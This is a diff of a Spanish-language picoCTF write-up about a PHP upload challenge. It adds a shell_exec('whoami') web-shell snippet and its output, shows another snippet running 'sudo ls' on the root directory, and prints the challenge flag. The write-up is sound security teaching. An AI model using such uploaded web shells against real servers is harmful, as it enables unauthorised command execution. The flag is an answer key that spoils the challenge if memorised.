@@ -39,6 +39,16 @@ Tengo resultados, el código se ha ejecutado, ahora sabemos que el archivo que h
 
 Después de hacer algunos cambios y resubir el archivo varias veces caigo en la cuenta de que con el directorio root no estoy teniendo suerte, añado una salida para comprobar que php se está ejecutando ```echo "Salida commando\n";```, así que añado sudo y descubro la sorpresa, el usuario actual ha sido añadido al fichero sudoers y ni siquiera necesita una password para ejecutar comandos del sistema.
 
+```
+<?php
+$output = shell_exec("whoami");
+echo "Salida commando\n";
+echo $output;
+?>
+```
+
+```Salida commando www-data```
+
 ``` 
 <?php
 $output = shell_exec("sudo ls ../../../../root/");
@@ -60,5 +70,6 @@ echo $output;
 
 flag: **picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}**
 
-Un buen ejemplo de como un RFI (Remote file inclusion) se puede convertir en un RCE (Remote code execution). Pues aunque el código PHP se ejecuta del lado del servidor la acción de visitar a la página subida es la que lleva a cabo la ejecución en el servidor. 
+Un buen ejemplo de como una mala praxis a la hora de asignar permisos a usuarios en este caso www-data en combinación con la falta de sanitización
+de las entradas en la aplicación permite un RFI (Remote file inclusion) que se converte en un RCE (Remote code execution). Pues aunque el código PHP se ejecuta del lado del servidor la acción de visitar a la página subida es la que lleva a cabo la ejecución en el servidor remotamente. 
 Sanitizen sus entradas o perezcan en el camino. 
